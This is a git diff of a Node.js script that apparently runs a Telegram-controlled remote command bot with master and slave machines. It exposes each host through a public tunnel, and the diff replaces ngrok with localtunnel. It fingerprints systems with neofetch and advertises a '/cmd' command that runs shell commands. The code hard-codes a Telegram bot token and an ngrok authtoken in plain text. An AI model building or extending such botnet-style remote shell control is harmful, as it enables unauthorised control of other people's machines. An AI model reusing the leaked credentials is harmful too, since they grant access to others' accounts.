@@ -1,13 +1,10 @@
-const express = require('express'), TelegramBot = require('node-telegram-bot-api'), ngrok = require('ngrok'), { exec } = require('child_process'), https = require('https'), os = require('os');
+const express = require('express'), TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), https = require('https'), os = require('os'), localtunnel = require('localtunnel');
 const TOKEN = '7898378784:AAH7RAql823WY3nE25ph28kyO2N20Rhqbts', CHAT_ID = '7371969470', PORT = Math.floor(Math.random() * 2000) + 8000, HOSTNAME = os.hostname(), MASTER = process.env.MASTER === 'true', MASTER_URL = process.env.MASTER_URL;
 const app = express(); app.use(express.json()); const bot = new TelegramBot(TOKEN); let startTime = Math.floor(Date.now() / 1000); let slaves = [];
 const runNeofetch = cb => exec('[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (git clone https://github.com/dylanaraps/neofetch && ./neofetch/neofetch --stdout)', (_, o) => cb((o || '').trim()));
 const extractUptime = t => (t.match(/Uptime:\s*(.+)/)?.[1] || 'unknown').trim();
 const notifyLost = h => { bot.sendMessage(CHAT_ID, `⚠️ *Slave ${h} mất kết nối!*`, { parse_mode: 'Markdown' }); slaves = slaves.filter(s => s.hostname !== h); };
-setInterval(() => {
-  const now = Date.now();
-  slaves.forEach(s => { if (now - s.lastPing > 5000) notifyLost(s.hostname); });
-}, 2000);
+setInterval(() => { const now = Date.now(); slaves.forEach(s => { if (now - s.lastPing > 5000) notifyLost(s.hostname); }); }, 2000);
 app.post(`/bot${TOKEN}`, (req, res) => {
   const msg = req.body?.message; if (!msg?.text || msg.date < startTime) return res.sendStatus(200); const text = msg.text.trim();
   if (text === '/help') return bot.sendMessage(msg.chat.id, '/status - Kiểm tra bot\n/cmd <lệnh> - Chạy lệnh\n/help - Trợ giúp') && res.sendStatus(200);
@@ -48,7 +45,7 @@ app.post('/ping', (req, res) => {
   const { hostname } = req.body; const s = slaves.find(s => s.hostname === hostname); if (s) s.lastPing = Date.now(); res.sendStatus(200);
 });
 app.listen(PORT, async () => {
-  const tunnelUrl = await ngrok.connect({ addr: PORT, authtoken: '2vYxj61YOTLvexLXiP1NLURo1As_6mwXrfWQLynnwpmCxx7Lj' });
+  const tunnel = await localtunnel({ port: PORT }); const tunnelUrl = tunnel.url;
   console.log(`🚀 PORT ${PORT}`); console.log(`🌍 URL ${tunnelUrl}`);
   runNeofetch(out => {
     const uptime = extractUptime(out);
